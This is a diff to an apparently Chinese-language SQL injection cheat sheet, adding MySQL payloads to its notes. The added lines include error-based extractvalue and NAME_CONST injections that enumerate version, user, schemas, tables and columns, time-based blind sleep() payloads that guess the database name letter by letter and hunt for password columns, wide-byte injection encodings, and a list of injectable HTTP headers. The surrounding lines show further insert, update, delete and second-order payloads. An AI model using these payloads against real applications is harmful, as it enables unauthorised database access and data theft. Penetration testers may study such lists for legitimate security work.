@@ -225,6 +225,18 @@ insert into users (id, username, password) values (2, '' or !(select*from(select
 update users set password='Peter' or !(select*from(select user())x)-~0 or '' where id=4;
 
 delete from users where id='1' or !(select*from(select user())x)-~0 or '';
+
+Extractvalue
+?id=1 AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--
+?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
+?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
+?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
+?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--
+
+NAME_CONST
+?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--
+?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--
+?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--
 ```
 
 盲注：
@@ -244,6 +256,16 @@ delete from users where id='1' or !(select*from(select user())x)-~0 or '';
 SLEEP函数
 1' and if(length(database())>=4,sleep(5),1)--+
 1' and if(ascii(mid(database(),1,1))='100',sleep(5),1)--+
+1 and (select sleep(10) from dual where database() like '%')#
+1 and (select sleep(10) from dual where database() like '___')#
+1 and (select sleep(10) from dual where database() like '_____')#
+1 and (select sleep(10) from dual where database() like 'a____')#
+1 and (select sleep(10) from dual where database() like 's____')#
+1 and (select sleep(10) from dual where database() like 'sa___')#
+1 and (select sleep(10) from dual where database() like 'swa__')#
+1 and (select sleep(10) from dual where database() like 'swb__')#
+1 and (select sleep(10) from dual where database() like 'swi__')#
+1 and (select sleep(10) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%pass%' limit 0,1) like '%')#
 
 BENCHMARK
 Select * from users where user_id= 1 and (if(ascii(substr(database(),1,1))=100,benchmark(100000000,sha(1)), null));
@@ -278,6 +300,23 @@ ad(1,999999,a) ,rpad (1,999999,a),rpad(1,999999,a),rpad(1,999999,a )) RLIKE '(a.
 注册或更新个人资料如下
 I love programming', email=(SELECT email FROM users WHERE username='admin') --
 当执行SQL语句时，会发生以下情况：
-> + 末尾的注释--可确保原始 SQL 查询的其余部分被注释掉。
-> + 子查询(SELECT email FROM users WHERE username='admin')预计将执行并email用管理员用户的电子邮件替换该列。
+末尾的注释--可确保原始 SQL 查询的其余部分被注释掉
+子查询(SELECT email FROM users WHERE username='admin'）将执行用管理员用户的电子邮件替换该列
 ```
+
+宽字节注入：
+```sql
+%bf%27
+%df%5c
+%A8%27
+```
+
+HTTP请求头注入：
+```sql
+User-Agent
+Cookie
+Referer
+X-Forward-For
+```
+
+## 4.身份验证绕过
